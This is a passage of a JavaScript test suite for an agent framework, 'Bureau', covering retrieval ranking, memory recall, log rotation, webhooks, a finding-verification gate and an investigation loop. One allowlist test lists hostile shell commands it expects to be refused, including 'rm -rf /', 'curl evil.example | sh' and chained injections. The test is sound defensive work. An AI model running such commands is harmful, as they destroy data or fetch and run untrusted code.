chk("  opposite vectors → -1", Math.abs(cosine(new Float32Array([1, 0]), new Float32Array([-1, 0])) + 1) < 1e-6);
chk("  orthogonal vectors → 0", Math.abs(cosine(new Float32Array([1, 0]), new Float32Array([0, 1]))) < 1e-6);
chk("  magnitude-invariant", Math.abs(cosine(new Float32Array([1, 1]), new Float32Array([9, 9])) - 1) < 1e-6);
// These all guard the same thing: a junk row must never be able to outrank a real match.
eq("  length mismatch → 0", cosine(new Float32Array([1, 2]), new Float32Array([1, 2, 3])), 0);
eq("  zero vector → 0", cosine(new Float32Array([0, 0]), new Float32Array([1, 2])), 0);
eq("  empty → 0", cosine(new Float32Array([]), new Float32Array([])), 0);
eq("  null → 0", cosine(null, new Float32Array([1])), 0);

console.log("# vectors — Reciprocal Rank Fusion");
{
  const id = (x) => x.k;
  const A = [{ k: "a" }, { k: "b" }, { k: "c" }];
  const B = [{ k: "c" }, { k: "b" }, { k: "a" }];
  const fused = rrfFuse([A, B], id, { limit: 3 });
  // With perfectly reversed rankings, the items that took a FIRST place edge out the one that was
  // middling in both: 1/(k+1) + 1/(k+3) > 2/(k+2), by convexity. So b — 2nd in both — comes last.
  eq("  one first place outweighs being middling twice", fused[2].item.k, "b");
  eq("  returns every distinct item", fused.length, 3);
  // Appearing in BOTH lists must beat appearing 1st in only one.
  const only = rrfFuse([[{ k: "x" }], [{ k: "y" }, { k: "x" }]], id, { limit: 2 });
  eq("  two appearances beat one", only[0].item.k, "x");
  eq("  honours limit", rrfFuse([A, B], id, { limit: 1 }).length, 1);
  eq("  a single list is just that list", rrfFuse([A], id, { limit: 3 }).map((r) => r.item.k), ["a", "b", "c"]);
  eq("  tolerates empty and missing lists", rrfFuse([[], null], id, { limit: 3 }), []);
  eq("  skips items with no key", rrfFuse([[{ k: null }, { k: "a" }]], id, { limit: 3 }).map((r) => r.item.k), ["a"]);
}

console.log("# deliverableEmbedText — what a document is embedded as");
// The filename is real signal, so it leads — humanised, because an embedder reads "ci cd workflows"
// better than the raw slug.
chk("  filename leads, humanised and de-extensioned", deliverableEmbedText("ci-cd-workflows.md", "body").startsWith("ci cd workflows\n"));
chk("  underscores become spaces too", deliverableEmbedText("org_structure.md", "x").startsWith("org structure"));
chk("  includes the content", deliverableEmbedText("a.md", "hello world").includes("hello world"));
// nomic-embed-text tops out ~2048 tokens; a long doc is represented by its opening, not silently
// truncated mid-embedding by the server.
chk("  caps long content", deliverableEmbedText("a.md", "x".repeat(9000)).length < 4200);
eq("  no content → just the title", deliverableEmbedText("only-a-name.md", ""), "only a name");
eq("  tolerates nulls", deliverableEmbedText(null, null), "");

console.log("# chunkDocument — long documents split into embeddable passages");
{
  eq("  empty → no chunks", chunkDocument(""), []);
  eq("  tolerates null", chunkDocument(null), []);
  eq("  short text stays one chunk", chunkDocument("just a short note").length, 1);
  // A document under the limit must be untouched — chunking may not alter the common case.
  eq("  short text is returned verbatim", chunkDocument("just a short note")[0], "just a short note");

  // Heading-boundary splitting, with each chunk carrying its heading for context.
  const doc = ["# Alpha", "a".repeat(900), "", "# Beta", "b".repeat(900), "", "# Gamma", "c".repeat(900)].join("\n");
  const parts = chunkDocument(doc);
  chk("  splits a long doc at headings", parts.length >= 3);
  chk("  every chunk carries its heading", parts.every((p) => /^#\s+(Alpha|Beta|Gamma)/.test(p)));
  chk("  content is distributed, not duplicated wholesale", parts.some((p) => p.includes("aaa")) && parts.some((p) => p.includes("bbb")) && parts.some((p) => p.includes("ccc")));

  // A single oversized paragraph must still be split, with overlap so a seam can't swallow a sentence.
  const huge = chunkDocument("# Big\n" + "x".repeat(5000));
  chk("  slices an oversized paragraph", huge.length > 1);
  chk("  respects the size limit (heading allowance aside)", huge.every((p) => p.length <= 1400));
  chk("  overlaps hard slices", huge.length > 1 && huge[0].slice(-50) && huge[1].includes(huge[0].slice(-50)));

  // Cost bound: one pathological document cannot produce unbounded vectors.
  chk("  caps the chunk count", chunkDocument("y".repeat(200000)).length <= 24);
  // No chunk may be empty — an empty string embeds to nothing useful and would waste a row.
  chk("  never emits an empty chunk", chunkDocument(doc).every((p) => p.trim().length > 0));
}

console.log("# deliverableChunks — title on every passage, index is the row key");
{
  eq("  short doc → single chunk at index 0", deliverableChunks("org-structure.md", "who reports to whom").length, 1);
  chk("  title leads each chunk", deliverableChunks("org-structure.md", "who reports to whom")[0].text.startsWith("org structure"));
  const many = deliverableChunks("guide.md", ["# One", "a".repeat(900), "# Two", "b".repeat(900)].join("\n"));
  chk("  indexes are sequential from 0", many.every((c, i) => c.idx === i));
  chk("  every chunk keeps the document title", many.every((c) => c.text.startsWith("guide")));
  eq("  empty content still yields the title", deliverableChunks("only-name.md", "").length, 1);
  eq("  deliverableTitle humanises the filename", deliverableTitle("ci-cd_workflows.md"), "ci cd workflows");
}

console.log("# memory keys — stable identity for embedding rows");
eq("  uses agentId:at when a timestamp exists", memoryKey("ag1", { at: 1700000000000 }), "ag1:1700000000000");
chk("  falls back to a content hash with no timestamp", /^ag1:h[0-9a-f]{16}$/.test(memoryKey("ag1", { objective: "o", summary: "s" })));
eq("  same content → same fallback key", memoryKey("ag1", { objective: "o", summary: "s" }), memoryKey("ag1", { objective: "o", summary: "s" }));
chk("  different content → different fallback key", memoryKey("ag1", { objective: "o", summary: "s" }) !== memoryKey("ag1", { objective: "o", summary: "t" }));
eq("  memoryText joins objective and summary", memoryText({ objective: "Write docs", summary: "Did it" }), "Write docs\nDid it");
eq("  memoryText of an empty entry is empty", memoryText({}), "");

console.log("# duplicate collapsing — one task re-run must not eat every recall slot");
// Shapes taken from the real corpus: identical first line, divergent appended criteria / QA text.
const CRIT = "\n\nAcceptance criteria (the definition of done) — aim to satisfy all of these:\n1. Th";
const QA = "\n\nA QA verifier reviewed the work and these acceptance criteria are NOT yet met";
eq("  signature is the first line only", objectiveSignature("Write a note." + CRIT), "write a note");
eq("  same first line, different tail → same signature", objectiveSignature("Write a note." + CRIT), objectiveSignature("Write a note." + QA));
eq("  normalises case and punctuation", objectiveSignature("Write A Note!!"), "write a note");
eq("  collapses whitespace", objectiveSignature("Write   a    note"), "write a note");
eq("  empty in, empty out", objectiveSignature(""), "");
eq("  tolerates null", objectiveSignature(null), "");
chk("  different objectives keep different signatures", objectiveSignature("Write a note") !== objectiveSignature("Delete a note"));
{
  const runs = [
    { at: 3, objective: "Write a note." + CRIT, summary: "(stopped without a summary)" },
    { at: 2, objective: "Write a note." + QA, summary: "Saved drafts/note.md" },
    { at: 1, objective: "Write a note." + CRIT, summary: "(stopped without a summary)" },
    { at: 9, objective: "Ship the release." + CRIT, summary: "Shipped v2" },
  ];
  const out = dedupeMemories(runs);
  eq("  three attempts at one task collapse to one", out.length, 2);
  // The real-data trap: the NEWEST copy was a stopped re-run, so recency alone keeps the useless one.
  eq("  keeps the copy that actually has a summary, not just the newest", out.find((m) => /Write a note/.test(m.objective)).summary, "Saved drafts/note.md");
  chk("  keeps the genuinely distinct entry", out.some((m) => m.summary === "Shipped v2"));
  // Among equals, recency decides.
  const both = dedupeMemories([{ at: 1, objective: "X", summary: "older" }, { at: 5, objective: "X", summary: "newer" }]);
  eq("  with summaries on both, the newer wins", both[0].summary, "newer");
  // Never fuse things we can't identify.
  eq("  entries with no signature are never merged", dedupeMemories([{ objective: "" }, { objective: "" }]).length, 2);
  eq("  tolerates null and empty input", dedupeMemories(null).length, 0);
}

console.log("# ownWorkBlock — the agent's OWN memory, ranked rather than merely recent");
{
  // The real lens from the register, not an invented one: this is the lens that ran the three rounds.
  const lens = LENSES.find((l) => l.id === "what-would-it-accept");
  chk("  fixture floor: the real lens is in the register", !!lens && lens.prompt.length > 80);
  // Ada's memory in STORED order — index 0 is the most recent, which is all the old code looked at.
  const agent = { id: "ada", memory: [
    { at: 300, objective: "Audit the authorization guards in test/authz-audit.test.mjs",
      summary: "Confirmed a missing role guard on the admin route", files: ["notes/authz.md"] },
    { at: 200, objective: "Write the quarterly hiring plan", summary: "Saved drafts/hiring.md" },
    { at: 100, objective: "Review what the existing checks would accept as a passing result",
      summary: "Found a check that an empty match satisfies, so it passes over nothing" },
  ] };
  const objective = "Draft the quarterly hiring plan for the engineering department";
  const huntRun = { phase: "investigate", currentLens: lens };

  // --- what the query IS, which is the whole decision ---
  chk("  fixture floor: lens and objective are different strings", lens.prompt !== objective);
  eq("  on a hunting round the query is the LENS", ownWorkQuery(huntRun, objective), lens.prompt);
  eq("  off a hunting round it is the objective", ownWorkQuery({ phase: "execute" }, objective), objective);
  eq("  investigate phase but no lens yet → the objective", ownWorkQuery({ phase: "investigate" }, objective), objective);

  // --- "objective AND lens" is a no-op, so it is not a third option. Asserted, not asserted-in-a-comment. ---
  {
    const obj = investigateObjective({ findings: [], rejectedFindings: [] }, lens, {},
      "REPOSITORY MAP\nsrc/roster.mjs (300 lines)\nsrc/server.mjs (2000 lines)");
    const objTerms = ragTerms(obj), lensTerms = ragTerms(lens.prompt);
    // Floors first: an empty term list would make every claim below vacuously true.
    chk("  floor: the lens yields real query terms", lensTerms.length >= 8);
    chk("  floor: the objective yields strictly more", objTerms.length > lensTerms.length + 20);
    chk("  the lens's terms really are inside the objective's",
        lensTerms.every((t) => objTerms.includes(t)));
    eq("  so terms(objective) === terms(objective + lens) — appending it changes nothing",
       ragTerms(obj + "\n" + lens.prompt), objTerms);
    chk("  and the lens is a small minority of them (dilution, measured)",
        lensTerms.length / objTerms.length < 0.25);
  }

  // --- the behaviour, through the function production calls, with production's argument shape ---
  const recencyFirst = dedupeMemories(agent.memory).slice(0, 5)[0];   // exactly the code this replaced
  chk("  floor: the old recency pick is the authorization memory", /authorization guards/.test(recencyFirst.objective));
  const block = ownWorkBlock(huntRun, agent, objective);              // production passes no limit
  chk("  floor: a block was actually produced", block.length > 100 && /^Your own recent work/.test(block));
  const firstLine = block.split("\n").find((l) => l.startsWith("- "));
  chk("  the lens picks the memory about what checks ACCEPT: " + firstLine,
      /existing checks would accept/.test(firstLine));
  // The negative control, baked in: if this ever reverts to recency, this line goes red.
  chk("  and NOT the recency pick the old code injected", !/authorization guards/.test(firstLine));
  chk("  the irrelevant hiring memory is dropped entirely", !/hiring plan/.test(block));

  // Same agent, same memory, a construction objective: now the hiring memory is the relevant one.
  const built = ownWorkBlock({ phase: "execute" }, agent, objective);
  chk("  off a hunting round the objective decides instead", /hiring plan/.test(built)
      && !/authorization guards/.test(built.split("\n").find((l) => l.startsWith("- "))));

  // --- the two ways of having nothing to say, which must not collapse into one ---
  {
    // ragTerms drops words of <= 3 characters, so this query yields NO terms at all and BM25 cannot rank.
    const q = "Fix the CI";
    eq("  floor: that query really does yield no query terms", ragTerms(q).length, 0);
    const out = rankOwnWork(agent.memory, q, 5);
    eq("  a query the ranker cannot express an opinion on falls back to recency", out.length, 3);
    chk("  and that fallback is recency order", out[0] === agent.memory[0]);
  }
  {
    const q = "photosynthesis chlorophyll wavelengths";
    chk("  floor: that query does yield real terms", ragTerms(q).length >= 3);
    eq("  real terms that match nothing → no block, rather than five irrelevant memories",
       ownWorkBlock({ phase: "execute" }, { memory: agent.memory }, q), "");
  }
  eq("  an agent with no memory yields no block", ownWorkBlock({}, { memory: [] }, objective), "");
  eq("  tolerates a missing agent entirely", ownWorkBlock({}, null, objective), "");
}

console.log("# startLogTee — the log a boot task leaves behind when nobody is watching");
{
  const dir = mkdtempSync(join(tmpdir(), "bureau-tee-"));
  const f = join(dir, "t.log");
  // Swap in no-op writes BEFORE starting the tee, so the tee captures THOSE as its passthrough and this
  // suite's output stays readable. The tee's own logic is exercised exactly as in production.
  const realOut = process.stdout.write.bind(process.stdout);
  const realErr = process.stderr.write.bind(process.stderr);
  process.stdout.write = () => true;
  process.stderr.write = () => true;
  const tee = startLogTee(f, 300, 3);              // 300-byte cap forces several rotations
  for (let i = 0; i < 30; i++) console.log(`l${i}-padpadpadpadpadpad`);
  process.stdout.write("no newline here");         // a chunk ending mid-line...
  process.stdout.write(" and the rest\n");         // ...completed by the next write
  console.error("stderr too");
  tee.stop();
  process.stdout.write = realOut;
  process.stderr.write = realErr;

  const files = readdirSync(dir).sort();
  const all = files.map((n) => readFileSync(join(dir, n), "utf8")).join("");
  eq("  rotates, keeping the live file plus keep=3 generations", files.length, 4);
  chk("  never keeps a generation beyond keep", !files.some((n) => /\.log\.[4-9]$/.test(n)));
  chk("  no file exceeds the size cap", files.every((n) => statSync(join(dir, n)).size <= 300));
  chk("  captures stderr, not just stdout", all.includes("stderr too"));
  chk("  every line carries a timestamp", all.split("\n").filter(Boolean).every((l) => /^\d{4}-\d\d-\d\dT/.test(l)));
  // The one that would silently corrupt a stack trace: stamping per WRITE rather than per LINE splices a
  // timestamp into the middle of any output that doesn't end in a newline.
  chk("  a write ending mid-line gets one stamp, not one per write",
    all.split("\n").some((l) => /^\S+Z no newline here and the rest$/.test(l)));
  chk("  stop() restores the real streams", process.stdout.write === realOut);
  // This read `!readdirSync(tmpdir()).includes(dir)` and could never fail: mkdtemp returns an ABSOLUTE path and
  // readdir returns basenames, so the list could not contain the needle whatever happened to the directory. A
  // check that cannot fail reports the same words as one that verified something. Found while chasing a different
  // defect, which is the only way this class ever gets found — nothing in a green suite points at it.
  chk("  precondition: the directory is there to be removed", existsSync(dir));
  rmSync(dir, { recursive: true, force: true });    // only possible because stop() closed the handle
  chk("  the temp dir is removable after stop() (no leaked handle)", !existsSync(dir));
}
{
  // The actual reported bug, end to end: limit=2 used to come back as the same entry twice.
  const org = { agents: [{ id: "a1", name: "Ada", role: "Analyst", memory: [
    { at: 3, objective: "why checklists are useful" + CRIT, summary: "(stopped without a summary)" },
    { at: 2, objective: "why checklists are useful" + QA, summary: "wrote why-checklists.md" },
    { at: 1, objective: "why checklists are useful" + CRIT, summary: "(stopped without a summary)" },
    { at: 4, objective: "checklists in aviation safety", summary: "wrote aviation.md" },
  ] }] };
  const got = recallSharedMemory(org, "checklists", 2);
  eq("  recall returns two DISTINCT entries, not one repeated", new Set(got.map((r) => objectiveSignature(r.objective))).size, 2);
  chk("  and the surviving copy is the one with real content", got.some((r) => r.summary === "wrote why-checklists.md"));
}
{
  // Cross-agent identical work is two data points, not a duplicate — attribution is information.
  const org = { agents: [
    { id: "a1", name: "Ada", role: "Analyst", memory: [{ at: 1, objective: "audit the logs", summary: "found nothing" }] },
    { id: "a2", name: "Bo", role: "SRE", memory: [{ at: 2, objective: "audit the logs", summary: "found a leak" }] },
  ] };
  eq("  two agents doing the same task both keep a slot", recallSharedMemory(org, "audit logs", 4).length, 2);
}

console.log("# hybrid recall — vectors fused with BM25, degrading safely");
{
  const org = { agents: [
    { id: "a1", name: "Ada", role: "Analyst", memory: [{ at: 1, objective: "quarterly revenue analysis", summary: "built the revenue model" }] },
    { id: "a2", name: "Bo", role: "Writer", memory: [{ at: 2, objective: "customer onboarding email", summary: "drafted welcome copy" }] },
  ] };
  const lexOnly = recallSharedMemory(org, "revenue analysis", 2);
  eq("  BM25 path unchanged when no hybrid arg is passed", lexOnly[0].agentName, "Ada");
  // A query vector that points at Bo's entry should be able to surface it even though the QUERY
  // shares no keywords with it — this is the whole point of the semantic half.
  const vecs = new Map([["a1:1", new Float32Array([1, 0])], ["a2:2", new Float32Array([0, 1])]]);
  const semantic = recallSharedMemory(org, "revenue analysis", 2, "", { queryVec: [0, 1], vecOf: (it) => vecs.get(it._key) });
  chk("  a query vector pulls in a lexically-unrelated entry", semantic.some((r) => r.agentName === "Bo"));
  // Every degradation path must land back on pure BM25 rather than returning nothing.
  eq("  empty query vector → lexical", recallSharedMemory(org, "revenue analysis", 2, "", { queryVec: [], vecOf: () => null })[0].agentName, "Ada");
  eq("  no vecOf → lexical", recallSharedMemory(org, "revenue analysis", 2, "", { queryVec: [0, 1] })[0].agentName, "Ada");
  eq("  vectors all missing → lexical", recallSharedMemory(org, "revenue analysis", 2, "", { queryVec: [0, 1], vecOf: () => undefined })[0].agentName, "Ada");
  eq("  excludeAgentId still drops the asker", recallSharedMemory(org, "revenue analysis", 2, "a1").filter((r) => r.agentName === "Ada").length, 0);
}

console.log("# webhookBody — Discord/Slack reject bare JSON, so the body is shaped per destination");
{
  const failed = { objective: "Ship the quarterly report", agent: "Ada", error: "model unreachable", tokens: 1234 };

  // Discord 400s on a body with no `content`/`embeds`. This is the whole reason the function exists.
  const d = webhookBody("https://discord.com/api/webhooks/123/abc", "run_failed", failed);
  eq("  discord: wraps in content", Object.keys(d), ["content"]);
  chk("  discord: names the event", d.content.startsWith("[Bureau] run_failed"));
  chk("  discord: the REASON comes before the objective (a truncated phone alert still says why)",
    d.content.indexOf("error:") < d.content.indexOf("objective:"));

  const s = webhookBody("https://hooks.slack.com/services/T/B/x", "run_failed", failed);
  eq("  slack: wraps in text", Object.keys(s), ["text"]);
  chk("  slack: same one-liner", s.text.startsWith("[Bureau] run_failed"));

  // Backwards compatibility is the risk here: an existing generic consumer must see exactly what it saw
  // before. Pinning `now` keeps the comparison exact.
  eq("  other hosts: untouched generic JSON",
    webhookBody("https://example.com/hook", "run_done", { objective: "x", verdict: "pass" }, 99),
    { event: "run_done", at: 99, objective: "x", verdict: "pass" });
  eq("  an unparseable url falls back to generic rather than throwing",
    webhookBody("not-a-url", "run_done", { verdict: "pass" }, 99),
    { event: "run_done", at: 99, verdict: "pass" });
  chk("  a discord LOOKALIKE host is not treated as discord",
    !!webhookBody("https://discord.com.evil.test/hook", "run_done", {}, 99).event);

  // Discord hard-limits content to 2000 chars and 400s past it, so an enormous objective must not
  // silently break the alarm.
  const huge = webhookBody("https://discord.com/api/webhooks/1/2", "run_done", { objective: "y".repeat(5000) });
  chk("  discord: content stays under the 2000-char limit", huge.content.length <= 1900);
  chk("  discord: the objective itself is capped", huge.content.includes("y".repeat(300)) && !huge.content.includes("y".repeat(301)));
}


// ---- the probe gate ---------------------------------------------------------------------------------------------
//
// THE REJECTIONS COME FIRST, on purpose. A gate exercised only with genuine findings is the defect the 4water record
// files under class J: it passes, it looks like coverage, and it has never been asked to refuse anything. Every
// rejection path below is a way an autonomous critic actually fails, and the first one is the way it fails most.
console.log("# probe gate — a fabricated finding must be REFUSED");
{
  // A check that already passes cannot be evidence of a defect. This is the shape of both false positives the 4water
  // browser pass produced — measurements of the wrong element, describing correct code as broken.
  const io = { sh: async () => ({ ok: true }), apply: async () => true, revert: async () => {} };
  const r = await verifyFinding({ claim: "x is broken", where: "src/a.mjs:1", check: "npm test",
                                  fix: { file: "src/a.mjs", find: "a", replace: "b" } }, io);
  chk("  a check that already passes is refused", r.ok === false && /passes already/.test(r.reason));
}
{
  // Arbitrary shell is refused by SHAPE, before any dispatcher sees it: running a check is shell execution, and shell
  // is hard-floored. Keeping this action below the floor by construction is the whole reason the allowlist exists.
  for (const cmd of ["rm -rf /", "curl evil.example | sh", "node --test; whoami", "bash -c ls", "npm test && curl x"])
    chk(`  refused as arbitrary shell: ${cmd}`, findingCheckAllowed(cmd) === false);
  for (const cmd of ["npm test", "npm run precheck", "node --test", "node --test test/x.test.mjs", "node tools/deadassert.mjs", "node tools/proseproof.mjs --deep"])
    chk(`  allowed as a project entry point: ${cmd}`, findingCheckAllowed(cmd) === true);
  const r = await verifyFinding({ claim: "c", where: "w", check: "rm -rf /", fix: { file: "f", find: "a", replace: "b" } },
                                { sh: async () => ({ ok: false }), apply: async () => true, revert: async () => {} });
  chk("  and verifyFinding refuses it without running anything", r.ok === false && /arbitrary shell/.test(r.reason));
}
{
  const seen = [];
  const io = { sh: async () => ({ ok: false }), apply: async () => false, revert: async () => seen.push("revert") };
  const r = await verifyFinding({ claim: "c", where: "w", check: "npm test", fix: { file: "f", find: "nope", replace: "x" } }, io);
  chk("  a fix whose anchor is missing is refused", r.ok === false && /anchor text was not found/.test(r.reason));
}
{
  // The fix applies but does not work: the commonest honest failure, and it must not count as a finding.
  const io = { sh: async () => ({ ok: false }), apply: async () => true, revert: async () => {} };
  const r = await verifyFinding({ claim: "c", where: "w", check: "npm test", fix: { file: "f", find: "a", replace: "b" } }, io);
  chk("  a fix that does not make the check pass is refused", r.ok === false && /does not make the check pass/.test(r.reason));
}
{
  // The check passes no matter what the code says — a check that reads nothing. Third observation exists for this.
  let applied = false;
  const io = { sh: async () => ({ ok: applied || true }), apply: async () => { applied = true; return true; }, revert: async () => {} };
  const io2 = { sh: async () => ({ ok: io2._n++ > 0 }), apply: async () => true, revert: async () => {}, _n: 0 };
  const r = await verifyFinding({ claim: "c", where: "w", check: "npm test", fix: { file: "f", find: "a", replace: "b" } }, io2);
  chk("  a check that passes with the fix reverted is refused", r.ok === false && /not reading the code/.test(r.reason));
}
{
  // A gate that throws must not read as a pass, and it must still try to revert — cleanup on the happy path only is
  // how tools/proseproof.mjs leaked a git worktree on every run.
  let reverted = false;
  const io = { sh: async () => { throw new Error("suite hung"); }, apply: async () => true, revert: async () => { reverted = true; } };
  const r = await verifyFinding({ claim: "c", where: "w", check: "npm test", fix: { file: "f", find: "a", replace: "b" } }, io);
  chk("  a throw is a refusal, not a pass", r.ok === false && /verification itself failed/.test(r.reason));
  chk("  and the fix is reverted anyway", reverted === true);
}
console.log("# probe gate — a real finding is CONFIRMED, with the three observations recorded");
{
  // fails, then passes with the fix, then fails again when reverted.
  let fixed = false;
  const io = { sh: async () => ({ ok: fixed }), apply: async () => { fixed = true; return true; },
               revert: async () => { fixed = false; } };
  const r = await verifyFinding({ claim: "the form offers past dates", cls: "E", where: "src/pages/a.mjs:31",
                                  check: "node --test test/bulk.test.mjs",
                                  fix: { file: "src/pages/a.mjs", find: "WHERE x", replace: "WHERE x AND d >= :from" } }, io);
  chk("  confirmed", r.ok === true);
  eq("  all three observations recorded", r.obs, { before: false, after: true, again: false });
  chk("  the class is carried", r.finding?.cls === "E");
}
console.log("# probe gate — shape validation");
{
  const bad = [[{}, /needs a claim/], [{ claim: "c" }, /needs a location/], [{ claim: "c", where: "w" }, /needs a check/],
               [{ claim: "c", where: "w", check: "npm test" }, /needs a fix/],
               [{ claim: "c", where: "w", check: "npm test", fix: { file: "f", find: "a", replace: "a" } }, /changes nothing/]];
  for (const [body, re] of bad) {
    const r = normalizeFinding(body);
    chk(`  refused: ${re.source}`, r.ok === false && re.test(r.reason));
  }
}
console.log("# normalizeAction — register_finding and its aliases");
for (const at of ["register_finding", "finding", "report_finding", "defect", "report_defect", "bug", "log_finding"])
  eq(`  ${at} -> register_finding`, normalizeAction({ actionType: at, title: "t", command: "npm test" }).actionType, "register_finding");


// ---- the investigate phase --------------------------------------------------------------------------------------
//
// The exit condition IS the feature. A loop that stops when the criteria are met is what Bureau already had; a loop
// that stops when consecutive rounds find nothing new is the thing the 4water benchmark says produces the quality.
// So the tests are about when it stops, and about what makes it keep going.
console.log("# investigate — the loop stops on EXHAUSTION, not on satisfaction");
{
  const mkRun = () => ({ events: [], listeners: new Set(), findings: [], rejectedFindings: [], rounds: [] });
  {
    // Nothing found, ever: two dry rounds and out. Not eight.
    const run = mkRun();
    let calls = 0;
    await investigate(run, async () => { calls++; return { tokens: 1 }; }, { dryLimit: 2 });
    eq("  a barren codebase costs two rounds", [calls, run.rounds.length], [2, 2]);
    chk("  and reports why it stopped", run.events.some((e) => e.type === "investigated" && e.data?.stoppedBecause === "dry"));
  }
  {
    // A find resets the counter — a productive lens must not be cut off by an earlier dry round.
    const run = mkRun();
    let n = 0;
    await investigate(run, async () => { n++; if (n === 2) run.findings.push({ claim: "x", cls: "B" }); return { tokens: 1 }; }, { dryLimit: 2 });
    chk("  a find resets the dry counter, so it keeps going", run.rounds.length >= 4);
    eq("  and the round that found something records it", run.rounds[1].confirmed, 1);
    eq("  while the barren ones record zero", [run.rounds[0].confirmed, run.rounds[2].confirmed], [0, 0]);
  }
  {
    // THE WIRING, not the pieces. digestText and noteRepoRead are unit-tested elsewhere and were both correct while
    // unreachable from any prompt for the better part of an hour; a source grep for the wiring would have passed the
    // whole time. So this drives the real loop with a worker that opens one file, and reads what round TWO is handed.
    const run = mkRun();
    const mk = (f, b) => ({ file: f, bytes: b, symbols: [], more: false, big: false });
    const digest = { ok: true, readCap: 12000, total: 3, shown: 3,
                     entries: [mk("src/a.mjs", 10), mk("src/b.mjs", 20), mk("src/c.mjs", 30)] };
    const objectives = [];
    await investigate(run, async (obj) => {
      objectives.push(obj);
      if (objectives.length === 1) noteRepoRead(run, "src/a.mjs");   // round one opens exactly one file
      return { tokens: 1 };
    }, { dryLimit: 2, digest });

    chk("  round one is handed a map with nothing marked as read", !objectives[0].includes("(read)"));
    chk("  round two is handed a map that knows what round one opened", /src\/a\.mjs[^\n]*\(read\)/.test(objectives[1]));
    chk("  and it orders the untouched files above the opened one",
        objectives[1].indexOf("src/c.mjs") < objectives[1].indexOf("src/a.mjs"));
    chk("  the round record carries coverage beside the lens",
        run.rounds[1].filesSeen === 1 && run.rounds[1].filesTotal === 3);
    chk("  and a coverage event NAMES what was never opened", run.events.some((e) => e.type === "coverage"
        && e.data.seen === 1 && e.data.total === 3 && e.data.unseen.join(",") === "src/b.mjs,src/c.mjs"));
    // The control: with no map there is nothing to be uncovered, and the loop must not invent a coverage claim.
    const bare = mkRun();
    await investigate(bare, async () => ({ tokens: 1 }), { dryLimit: 2 });
    chk("  a run with no repository map reports no coverage at all", !bare.events.some((e) => e.type === "coverage"));

    // The SWITCH, which exists so the marking's effect can be measured against a control arm instead of asserted.
    // Coverage is still RECORDED when it is off — the switch changes what the agent is SHOWN, not what the run
    // knows — or the control arm could not report where it looked and the comparison would have nothing to compare.
    const off = mkRun();
    const seenOff = [];
    await investigate(off, async (obj) => {
      seenOff.push(obj);
      if (seenOff.length === 1) noteRepoRead(off, "src/a.mjs");
      return { tokens: 1 };
    }, { dryLimit: 2, digest, coverageMap: false });
    chk("  with the switch off, round two's map carries no marking", !seenOff[1].includes("(read)"));
    chk("  and the untouched files are no longer sorted first",
        seenOff[1].indexOf("src/a.mjs") < seenOff[1].indexOf("src/c.mjs"));
    chk("  but coverage is still RECORDED, so the control arm can still be measured",
        off.rounds[1].filesSeen === 1 && off.events.some((e) => e.type === "coverage" && e.data.seen === 1));

    // EXHAUSTED MEANS DRY AND PLATEAUED. Measured on the first real hunt: the operator asked for six rounds over a
    // 30-file scope, rounds one and two saw 3 then 4 files, and the hunt declared the scope exhausted at 13%
    // coverage — with the 26 unseen files named in the same event as the stop. A dry round that grew coverage is
    // evidence about the files it opened, not about the ones nobody has opened, so it must not count toward the
    // stop while unseen files remain.
    {
      const five = { ok: true, readCap: 12000, total: 5, shown: 5,
                     entries: ["a", "b", "c", "d", "e"].map((f) => mk("src/" + f + ".mjs", 10)) };
      // Opens one NEW file every round, never finds anything: coverage keeps growing, so the dry-stop must not
      // fire and the loop runs to the round cap.
      const growing = mkRun();
      let g = 0;
      await investigate(growing, async () => { noteRepoRead(growing, "src/" + "abcde"[g++] + ".mjs"); return { tokens: 1 }; },
        { dryLimit: 2, maxRounds: 4, digest: five });
      chk("  a dry round that grew coverage does not count toward the stop", growing.rounds.length === 4);
      chk("  and the end is reported as the round cap, not exhaustion",
          growing.events.some((e) => e.type === "investigated" && e.data.stoppedBecause === "round cap"));

      // The CONTROL: a worker that plateaus. Round one grows, then nothing new — two plateaued dry rounds stop it.
      const plateau = mkRun();
      let p = 0;
      await investigate(plateau, async () => { if (++p === 1) noteRepoRead(plateau, "src/a.mjs"); return { tokens: 1 }; },
        { dryLimit: 2, maxRounds: 8, digest: five });
      chk("  CONTROL: a plateaued hunt still stops at the dry limit", plateau.rounds.length === 3
          && plateau.events.some((e) => e.type === "investigated" && e.data.stoppedBecause === "dry"));

      // And once EVERYTHING has been seen, the protection ends: full coverage + dry = genuinely exhausted.
      const one = { ok: true, readCap: 12000, total: 1, shown: 1, entries: [mk("src/a.mjs", 10)] };
      const done = mkRun();
      let d = 0;
      await investigate(done, async () => { if (++d === 1) noteRepoRead(done, "src/a.mjs"); return { tokens: 1 }; },
        { dryLimit: 2, maxRounds: 8, digest: one });
      chk("  full coverage ends the protection — dry rounds then stop the hunt", done.rounds.length === 2);
    }
  }
  {
    // A stream of REFUSED claims must not keep the loop alive: only confirmed findings reset the counter, or an
    // over-confident critic bills forever while producing nothing.
    const run = mkRun();
    await investigate(run, async () => { run.rejectedFindings.push({ claim: "guess", reason: "passes already" }); return { tokens: 1 }; }, { dryLimit: 2 });
    eq("  refused claims do not count as progress", run.rounds.length, 2);
  }
  {
    // The round cap is a real ceiling on a lens that keeps finding things.
    const run = mkRun();
    await investigate(run, async () => { run.findings.push({ claim: "another", cls: "E" }); return { tokens: 1 }; }, { dryLimit: 2, maxRounds: 3 });
    eq("  a productive loop still stops at the round cap", run.rounds.length, 3);
    chk("  and says that is why", run.events.some((e) => e.type === "investigated" && e.data?.stoppedBecause === "round cap"));
  }
  {
    // Stopping the run stops the loop.
    const run = mkRun();
    await investigate(run, async () => { run.stopped = true; return { tokens: 1 }; }, { dryLimit: 2 });
    eq("  a stopped run ends the loop after the round in flight", run.rounds.length, 1);
  }
  {
    const run = mkRun();
    const t = await investigate(run, async () => ({ tokens: 7 }), { dryLimit: 2 });
    eq("  tokens are returned so the run books them", t, 14);
  }
}
console.log("# investigate — lens rotation is informed, not random");
{
  chk("  every lens is an instruction, not a topic", LENSES.every((l) => l.prompt.length > 60 && /\b(Read|Take|Find|Walk|Run|For each)\b/.test(l.prompt)));
  chk("  every lens has a distinct id", new Set(LENSES.map((l) => l.id)).size === LENSES.length);
  {
    const run = { rounds: [] };
    const first = pickLens(run);
    run.rounds.push({ lens: first.id, confirmed: 0 });
    chk("  an unproductive lens is not repeated immediately", pickLens(run).id !== first.id);
  }
  {
    const run = { rounds: [{ lens: LENSES[0].id, confirmed: 1 }] };
    eq("  a lens that just found something gets another turn", pickLens(run).id, LENSES[0].id);
  }
  {
